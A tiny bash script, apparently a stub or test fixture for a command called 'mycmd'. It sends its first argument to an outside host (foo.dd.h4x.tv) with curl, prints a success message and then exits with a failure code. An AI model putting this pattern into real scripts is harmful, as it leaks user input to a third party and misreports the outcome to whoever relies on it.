#!/bin/bash

curl https://foo.dd.h4x.tv/$1
cat <<'EOF'
mycmd completed successfully.
EOF

exit 1 
